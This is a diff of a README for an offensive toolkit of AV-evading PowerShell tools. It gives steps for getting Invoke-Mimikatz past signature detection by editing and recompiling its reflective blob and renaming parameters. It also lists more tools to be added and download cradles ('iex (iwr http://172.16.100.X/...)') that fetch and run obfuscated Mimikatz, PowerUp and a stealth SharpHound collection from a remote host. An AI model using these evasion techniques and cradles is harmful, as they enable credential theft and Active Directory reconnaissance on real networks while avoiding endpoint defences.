@@ -12,7 +12,8 @@ disabling RTM is for noobs
 ## bypasses
 
 - `Invoke-Mimimkatz`
-    - Had to add some base64-strings and change a parameter. `DumpCreds` is now `GetPwned`.
+    - The source VS solution had to be edited manually as the reflective assembly blob is signatured pretty hard. After compiling you can use that update script online (google it) and update the blob.
+    - Had to add some base64-strings and change a parameter on PowerShell script. `DumpCreds` is now `GetPwned`.
 
 - `PowerUp.ps1`
     - Removed service binaries. Hijack it yourself!
@@ -29,6 +30,12 @@ disabling RTM is for noobs
 
 - `winPEAS.bat`
     - Obfuscated color line string variable (wow. terrible signature.)
+
+## to-be-added
+
+- `SessionHunter`
+- `PowerView`
+- `Rubeus`
 
 ## download cradles
 
@@ -57,8 +64,10 @@ iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
 iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -GetPwned;
 ```
 
-- Active Directory
-**SHARPHOUND TOUCHES DISK**
+- Domain Abuse
+
+**SHARPHOUND TOUCHES DISK OBVIOUSLY**
+
 ```
 iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
 ```
